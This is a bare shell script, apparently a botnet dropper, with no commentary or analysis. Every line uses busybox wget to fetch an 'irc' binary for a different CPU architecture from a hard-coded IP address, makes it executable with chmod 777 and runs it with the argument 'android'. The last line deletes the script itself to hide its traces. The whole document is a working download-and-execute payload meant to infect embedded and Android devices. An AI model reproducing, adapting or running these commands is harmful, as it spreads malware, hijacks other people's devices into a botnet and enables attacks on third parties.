busybox wget http://62.197.136.92/shitnet/irc.arm; chmod 777 irc.arm; ./irc.arm android
busybox wget http://62.197.136.92/shitnet/irc.arm5; chmod 777 irc.arm5; ./irc.arm5 android
busybox wget http://62.197.136.92/shitnet/irc.arm6; chmod 777 irc.arm6; ./irc.arm6 android
busybox wget http://62.197.136.92/shitnet/irc.arm7; chmod 777 irc.arm7; ./irc.arm7 android
busybox wget http://62.197.136.92/shitnet/irc.sh4; chmod 777 irc.sh4; ./irc.sh4 android
busybox wget http://62.197.136.92/shitnet/irc.arc; chmod 777 irc.arc; ./irc.arc android
busybox wget http://62.197.136.92/shitnet/irc.mips; chmod 777 irc.mips; ./irc.mips android
busybox wget http://62.197.136.92/shitnet/irc.mpsl; chmod 777 irc.mpsl; ./irc.mpsl android
busybox wget http://62.197.136.92/shitnet/irc.sparc; chmod 777 irc.sparc; ./irc.sparc android
busybox wget http://62.197.136.92/shitnet/irc.x86_64; chmod 777 irc.x86_64; ./irc.x86_64 android
busybox wget http://62.197.136.92/shitnet/irc.i686; chmod 777 irc.i686; ./irc.i686 android
busybox wget http://62.197.136.92/shitnet/irc.i586; chmod 777 irc.i586; ./irc.i586 android

rm $0